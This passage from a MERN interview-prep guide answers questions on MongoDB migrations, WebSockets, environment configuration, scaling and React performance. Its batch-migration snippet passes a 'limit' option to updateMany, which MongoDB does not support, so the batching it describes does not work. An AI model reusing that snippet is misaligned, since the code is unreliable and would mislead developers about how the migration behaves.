"Start monolith, extract microservices when needed"
- Begin with well-structured monolith (modular code)
- When a module needs independent scaling, extract it
- Don't start with microservices unless team is experienced
```

---

<a id="q77-how-do-you-handle-database-migrations-in-production"></a>
### Q77. How do you handle database migrations in production?

**Answer:**

```javascript
// MongoDB doesn't enforce schema, but you still need migrations for:
// - Adding default values to existing documents
// - Renaming fields
// - Restructuring data
// - Adding indexes

// Using migrate-mongo:
// npm install -g migrate-mongo
// migrate-mongo init
// migrate-mongo create add-user-role

// migrations/20240315-add-user-role.js
module.exports = {
  async up(db) {
    // Add 'role' field to all users who don't have it
    await db.collection('users').updateMany(
      { role: { $exists: false } },
      { $set: { role: 'user' } }
    );
    
    // Create index
    await db.collection('users').createIndex({ role: 1 });
    
    console.log('Migration: Added role field to users');
  },
  
  async down(db) {
    // Rollback
    await db.collection('users').updateMany({}, { $unset: { role: '' } });
    await db.collection('users').dropIndex({ role: 1 });
  }
};

// Run: migrate-mongo up
// Rollback: migrate-mongo down

// Best Practices:
// 1. Always write both up() and down()
// 2. Test migrations on staging first
// 3. For large collections, batch updates:
async function batchMigrate(db) {
  const batchSize = 1000;
  let processed = 0;
  
  while (true) {
    const result = await db.collection('users').updateMany(
      { role: { $exists: false } },
      { $set: { role: 'user' } },
      { limit: batchSize }
    );
    
    processed += result.modifiedCount;
    console.log(`Processed: ${processed}`);
    
    if (result.modifiedCount < batchSize) break;
    await new Promise(r => setTimeout(r, 1000)); // Don't overwhelm DB
  }
}

// 4. Non-breaking migration strategy:
// Step 1: Add new field (backward compatible)
// Step 2: Deploy code that writes to both old and new fields
// Step 3: Backfill old documents
// Step 4: Deploy code that only uses new field
// Step 5: Remove old field (optional)
```

---

<a id="q78-explain-websocket-vs-rest-when-to-use-which"></a>
### Q78. Explain WebSocket vs REST. When to use which?

**Answer:**

```javascript
// REST: Request-Response (Client asks, server answers)
// WebSocket: Bidirectional persistent connection (both can send anytime)

// REST (HTTP):
// Client ──request──▶ Server
// Client ◀──response── Server
// Connection closes after each request

// WebSocket:
// Client ◀──────────▶ Server
// Persistent connection, real-time data flow

// USE REST FOR:
// - CRUD operations (create user, get products)
// - Stateless operations
// - Cacheable data
// - Simple request-response patterns

// USE WEBSOCKET FOR:
// - Real-time chat
// - Live notifications
// - Stock price ticker
// - Online gaming
// - Collaborative editing (Google Docs)
// - Live sports scores

// WebSocket example with Socket.io:
const { Server } = require('socket.io');
const io = new Server(httpServer, { cors: { origin: '*' } });

io.on('connection', (socket) => {
  console.log('User connected:', socket.id);
  
  // Join a chat room
  socket.on('joinRoom', (room) => {
    socket.join(room);
    socket.to(room).emit('userJoined', { userId: socket.userId });
  });
  
  // Real-time message
  socket.on('sendMessage', (data) => {
    io.to(data.room).emit('newMessage', {
      userId: socket.userId,
      message: data.message,
      timestamp: new Date()
    });
  });
  
  // Typing indicator
  socket.on('typing', (room) => {
    socket.to(room).emit('userTyping', { userId: socket.userId });
  });
  
  socket.on('disconnect', () => {
    console.log('User disconnected:', socket.id);
  });
});
```

---

<a id="q79-how-do-you-handle-environment-specific-configurations"></a>
### Q79. How do you handle environment-specific configurations?

**Answer:**

```javascript
// 1. Environment variables (.env files)
// .env.development
NODE_ENV=development
PORT=5000
MONGO_URI=mongodb://localhost:27017/myapp_dev
JWT_SECRET=dev-secret-key
REDIS_URL=redis://localhost:6379

// .env.production
NODE_ENV=production
PORT=5000
MONGO_URI=mongodb+srv://user:pass@cluster.mongodb.net/myapp_prod
JWT_SECRET=super-secret-production-key-from-secrets-manager
REDIS_URL=redis://prod-redis.aws.com:6379

// 2. Config module
// config/index.js
const config = {
  development: {
    db: { uri: process.env.MONGO_URI, poolSize: 5 },
    jwt: { secret: process.env.JWT_SECRET, expiresIn: '24h' },
    cors: { origin: 'http://localhost:3000' },
    rateLimit: { max: 1000 }, // Relaxed for dev
    logging: { level: 'debug' }
  },
  production: {
    db: { uri: process.env.MONGO_URI, poolSize: 50 },
    jwt: { secret: process.env.JWT_SECRET, expiresIn: '15m' },
    cors: { origin: 'https://myapp.com' },
    rateLimit: { max: 100 },
    logging: { level: 'error' }
  },
  test: {
    db: { uri: 'mongodb://localhost:27017/myapp_test', poolSize: 5 },
    jwt: { secret: 'test-secret', expiresIn: '1h' },
    cors: { origin: '*' },
    rateLimit: { max: 10000 },
    logging: { level: 'silent' }
  }
};

module.exports = config[process.env.NODE_ENV || 'development'];

// 3. NEVER commit secrets to git
// .gitignore should include: .env, .env.local, .env.production
// Use AWS Secrets Manager, Vault, or CI/CD secrets for production
```

---

<a id="q80-what-is-horizontal-vs-vertical-scaling"></a>
### Q80. What is Horizontal vs Vertical Scaling?

**Answer:**

```
VERTICAL SCALING (Scale Up):
- Add more power to existing server
- 2GB RAM → 16GB RAM
- 2 CPU → 16 CPU
- Simpler but has limits
- Single point of failure

HORIZONTAL SCALING (Scale Out):
- Add more servers
- 1 server → 10 servers behind load balancer
- Virtually unlimited scaling
- Requires stateless application design

For Node.js apps:
┌──────────────────────────────────────┐
│           Load Balancer (Nginx/ALB)   │
└──────────┬────────────┬──────────────┘
           │            │            │
     ┌─────▼───┐  ┌─────▼───┐  ┌─────▼───┐
     │ Node #1 │  │ Node #2 │  │ Node #3 │
     └─────────┘  └─────────┘  └─────────┘
           │            │            │
     ┌─────▼────────────▼────────────▼─────┐
     │        Shared State (Redis)          │
     └─────────────────────────────────────┘
     
Requirements for horizontal scaling:
1. Stateless servers (no in-memory sessions)
2. Shared session store (Redis)
3. Shared file storage (S3, not local disk)
4. Database that can handle multiple connections
5. Centralized logging
```

---

<a id="bonus-react-frontend-interview-questions"></a>
## Bonus: React/Frontend Interview Questions

<a id="q81-what-is-virtual-dom-and-how-does-it-work"></a>
### Q81. What is Virtual DOM and how does it work?

**Answer:**

```javascript
// Virtual DOM = JavaScript representation of real DOM
// React doesn't update real DOM directly — it's too expensive

// Flow:
// 1. State changes → New Virtual DOM created
// 2. Diff (reconciliation) between old and new Virtual DOM
// 3. Only changed elements updated in real DOM (minimal updates)

// Example:
function Counter() {
  const [count, setCount] = useState(0);
  
  return (
    <div>
      <h1>Count: {count}</h1>        {/* Only this text updates */}
      <p>This paragraph stays same</p> {/* Not re-rendered in real DOM */}
      <button onClick={() => setCount(count + 1)}>Increment</button>
    </div>
  );
}

// When count changes:
// Virtual DOM diff finds: only <h1> text node changed
// Real DOM update: changes only that text node
// Rest of DOM untouched = FAST!
```

---

<a id="q82-useeffect-vs-uselayouteffect"></a>
### Q82. useEffect vs useLayoutEffect?

**Answer:**

```javascript
// useEffect: Runs AFTER paint (async, non-blocking)
// useLayoutEffect: Runs BEFORE paint (sync, blocks render)

useEffect(() => {
  // Runs after browser paints the screen
  // Good for: API calls, subscriptions, logging
  fetchData();
}, []);

useLayoutEffect(() => {
  // Runs before browser paints
  // Good for: DOM measurements, scroll position, animations
  const height = elementRef.current.getBoundingClientRect().height;
  // Avoids visual "flicker"
}, []);

// Rule: Use useEffect by default
// Use useLayoutEffect only when you need to measure/modify DOM before user sees it
```

---

<a id="q83-how-do-you-optimize-react-performance"></a>
### Q83. How do you optimize React performance?

**Answer:**

```javascript
// 1. React.memo (prevent unnecessary re-renders)
const ProductCard = React.memo(({ product }) => {
  return <div>{product.name} - ₹{product.price}</div>;
});
// Only re-renders if product prop actually changes

// 2. useMemo (expensive calculations)
const filteredProducts = useMemo(() => {
  return products.filter(p => p.category === selectedCategory);
}, [products, selectedCategory]); // Recompute only when these change

// 3. useCallback (stable function references)
const handleClick = useCallback((id) => {
  setSelected(id);
}, []); // Same function reference across renders

// 4. Lazy loading (code splitting)
const Dashboard = React.lazy(() => import('./pages/Dashboard'));

function App() {
  return (
    <Suspense fallback={<Loading />}>
      <Dashboard />
    </Suspense>
  );
}

// 5. Virtualization (for long lists)
import { FixedSizeList } from 'react-window';

function ProductList({ products }) {
  return (
    <FixedSizeList height={600} itemCount={products.length} itemSize={80}>
      {({ index, style }) => (
        <div style={style}>{products[index].name}</div>
      )}
    </FixedSizeList>
  );
}
// Renders only visible items (not all 10,000!)

// 6. Avoid inline objects/functions in JSX
// BAD: Creates new object every render
<Component style={{ color: 'red' }} onClick={() => handle(id)} />

// GOOD: Stable references
const style = useMemo(() => ({ color: 'red' }), []);
const handleClick = useCallback(() => handle(id), [id]);
<Component style={style} onClick={handleClick} />
```

---

<a id="q84-what-is-state-management-when-to-use-context-vs-redux-vs-zustand"></a>
### Q84. What is state management? When to use Context vs Redux vs Zustand?

**Answer:**

```javascript
// Context API: Simple, built-in, for low-frequency updates
// Good for: Theme, Auth, Language
// Bad for: Frequently changing data (causes full re-render tree)

const AuthContext = createContext();
function AuthProvider({ children }) {
  const [user, setUser] = useState(null);
  return (
    <AuthContext.Provider value={{ user, setUser }}>
      {children}
    </AuthContext.Provider>
  );
}

// Redux: Complex state, middleware, time-travel debugging
// Good for: Large apps with complex state interactions
// Overkill for: Small to medium apps

// Zustand: Simple, minimal boilerplate, great for medium apps
// Best of both worlds - simple like Context, performant like Redux
import { create } from 'zustand';

const useStore = create((set) => ({
  products: [],
  loading: false,
  
  fetchProducts: async () => {
    set({ loading: true });
    const res = await axios.get('/api/products');
    set({ products: res.data, loading: false });
  },
  
  addProduct: (product) => set((state) => ({
    products: [...state.products, product]
  }))
}));

// Usage:
function ProductList() {
  const { products, loading, fetchProducts } = useStore();
  useEffect(() => { fetchProducts(); }, []);
}

// RECOMMENDATION:
// Small app → useState + Context
// Medium app → Zustand
// Large enterprise app → Redux Toolkit
```

---

## Quick Reference: Top 20 Must-Know Concepts

| # | Topic | One-Line Answer |
|---|-------|-----------------|
| 1 | Pagination | Use cursor-based for large datasets, offset for small |
| 2 | Indexing | Index fields used in filter, sort, and join operations |
| 3 | JWT Refresh | Short-lived access (15min) + long-lived refresh (7d) tokens |
| 4 | Rate Limiting | express-rate-limit + Redis store for distributed systems |
| 5 | File Upload | Presigned S3 URLs for large files, multer for small |
| 6 | Caching | Multi-layer: In-memory → Redis → Database |
| 7 | Worker Threads | Offload CPU-heavy tasks to prevent event loop blocking |
| 8 | Circuit Breaker | Stop calling failed services, return fallback |
| 9 | Docker | Containerize for consistent environments |
| 10 | CI/CD | GitHub Actions: lint → test → build → deploy |
| 11 | Monitoring | Structured logs + APM (Sentry/Datadog) + Health checks |
| 12 | Security | Helmet + CORS + Rate limit + Input validation + HTTPS |
| 13 | Error Handling | Centralized middleware + custom error classes |
| 14 | Database Design | Embed for 1:few, Reference for 1:many |
| 15 | API Versioning | URL-based (/v1/, /v2/) for breaking changes |
| 16 | Transactions | Use for multi-document operations (order + stock) |
| 17 | WebSockets | Use for real-time features (chat, notifications) |
| 18 | Message Queues | Bull/RabbitMQ for async processing (emails, reports) |
| 19 | Scaling | Horizontal + Stateless + Shared state in Redis |
| 20 | Testing | Unit (Jest) + Integration (Supertest) + E2E (Cypress) |

---

## Interview Tips

1. **Always explain with a real example** from your project
2. **Mention trade-offs** — every solution has pros and cons
3. **Start with the simplest solution**, then mention advanced alternatives
4. **Use numbers** — "reduced response time from 2.5s to 200ms" sounds impressive
5. **Admit what you don't know** — "I haven't used X, but I would approach it by..."
6. **Ask clarifying questions** — "What's the expected scale?" "Is this a read-heavy or write-heavy system?"
7. **Think out loud** — Interviewers care about your thought process
8. **Practice system design** — Draw architecture diagrams
9. **Know your project deeply** — Be ready to defend every technical decision
10. **Stay calm** — It's okay to take 10 seconds to think before answering

---

*Last Updated: August 2026*
*Prepared for Full Stack (MERN) Developer Interviews*
